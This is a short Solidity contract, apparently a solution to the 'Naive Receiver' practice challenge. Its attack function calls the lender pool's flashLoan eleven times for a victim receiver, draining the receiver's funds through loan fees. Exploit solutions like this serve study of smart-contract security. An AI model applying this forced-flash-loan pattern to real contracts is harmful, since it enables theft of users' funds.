// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./NaiveReceiverLenderPool.sol";

contract AttackReceiver {
    address public pool;
    address public receiver;

    constructor(address pool_, address receiver_) {
        pool = pool_;
        receiver = receiver_;
    }

    function attack() public {
        for (uint256 i = 1; i <= 11; i++) {
            NaiveReceiverLenderPool(payable(pool)).flashLoan(receiver, 0);
        }
    }
}
